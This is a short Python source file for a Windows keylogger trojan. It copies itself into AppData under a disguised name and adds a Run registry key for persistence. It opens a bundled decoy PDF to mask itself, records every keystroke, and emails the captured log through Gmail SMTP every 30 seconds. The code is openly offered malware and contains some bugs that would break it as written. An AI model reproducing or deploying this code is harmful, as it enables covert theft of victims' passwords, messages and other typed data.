import pynput.keyboard
import smtplib
import threading
import time
import subprocess
import os
import shutil
import sys

log = ""
def add_to_registry():
	#persistence
	new_file = os.environ["appdata"] + "\\sysupgrades.exe"
	if not os.path.exists(new_file):
		shutil.copyfile(sys.executable,new_file)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
		subprocess.call(regedit_command, shell=True)

add_to_registry()

def open_added_file(dosya):
	added_file = sys._MEIPASS + "\\"+dosya
	subprocess.Popen(added_file, shell=True)


def callback_function(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
        #log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

#thread - threading

def thread_function(email,password):
    global log
    send_email(email, password, log)
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()


add_to_registry()
open_added_file("PDF.pdf")
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
	thread_function("email","sifre")
	keylogger_listener.join()
